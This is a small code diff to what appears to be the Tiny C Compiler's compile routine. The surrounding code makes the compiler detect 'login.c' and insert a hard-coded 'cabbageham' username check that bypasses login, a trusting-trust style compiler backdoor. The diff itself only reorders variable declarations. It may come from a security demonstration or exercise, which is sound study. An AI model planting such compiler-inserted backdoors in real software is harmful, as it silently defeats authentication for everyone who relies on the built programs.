@@ -738,8 +738,10 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     if(!strcmp(str, "login.c")) {
         printf("testing\n");
         char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
-        FILE *source = fopen(str, "r");
-		FILE *temp = fopen("temp.txt", "w");
+        FILE *source;
+        source = fopen(str, "r");
+		FILE *temp; 
+        temp = fopen("temp.txt", "w");
         char target_line[] = "static int do_login(const char *username){";
 		char buffer[50000];
 		while (fgets(buffer, 50000, source)) {
